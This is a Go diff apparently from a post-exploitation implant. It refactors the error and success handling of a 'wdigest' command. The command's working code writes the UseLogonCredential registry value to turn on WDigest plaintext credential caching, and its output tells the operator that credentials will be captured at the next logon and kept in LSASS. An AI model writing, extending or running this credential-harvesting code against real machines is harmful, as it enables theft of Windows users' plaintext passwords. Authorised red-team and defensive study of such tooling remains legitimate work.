@@ -32,11 +32,7 @@ func (c *WdigestCommand) Execute(task structs.Task) structs.CommandResult {
 	var args wdigestArgs
 	if task.Params != "" {
 		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Failed to parse parameters: %v", err)
 		}
 	}
 
@@ -52,11 +48,7 @@ func (c *WdigestCommand) Execute(task structs.Task) structs.CommandResult {
 	case "disable":
 		return wdigestSet(0)
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s (use status, enable, disable)", args.Action),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Unknown action: %s (use status, enable, disable)", args.Action)
 	}
 }
 
@@ -73,11 +65,7 @@ func wdigestStatus() structs.CommandResult {
 		sb.WriteString("  Status:             DISABLED (default on Windows 10+)\n")
 		sb.WriteString("\n  Use 'wdigest -action enable' to enable plaintext credential caching.\n")
 		sb.WriteString("  Credentials will be captured at next interactive logon.\n")
-		return structs.CommandResult{
-			Output:    sb.String(),
-			Status:    "success",
-			Completed: true,
-		}
+		return successResult(sb.String())
 	}
 	defer key.Close()
 
@@ -102,11 +90,7 @@ func wdigestStatus() structs.CommandResult {
 		sb.WriteString(fmt.Sprintf("\n  Negotiate:          %d\n", negVal))
 	}
 
-	return structs.CommandResult{
-		Output:    sb.String(),
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(sb.String())
 }
 
 // wdigestSet enables or disables WDigest credential caching
@@ -127,21 +111,13 @@ func wdigestSet(value uint32) structs.CommandResult {
 	// Open or create the key with write access
 	key, _, err := registry.CreateKey(registry.LOCAL_MACHINE, wdigestKeyPath, registry.SET_VALUE)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to open WDigest registry key: %v\nEnsure you are running as SYSTEM or Administrator.", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to open WDigest registry key: %v\nEnsure you are running as SYSTEM or Administrator.", err)
 	}
 	defer key.Close()
 
 	err = key.SetDWordValue("UseLogonCredential", value)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to set UseLogonCredential: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to set UseLogonCredential: %v", err)
 	}
 
 	var sb strings.Builder
@@ -158,9 +134,5 @@ func wdigestSet(value uint32) structs.CommandResult {
 		sb.WriteString("  Existing cached credentials remain in LSASS until process restart.\n")
 	}
 
-	return structs.CommandResult{
-		Output:    sb.String(),
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(sb.String())
 }
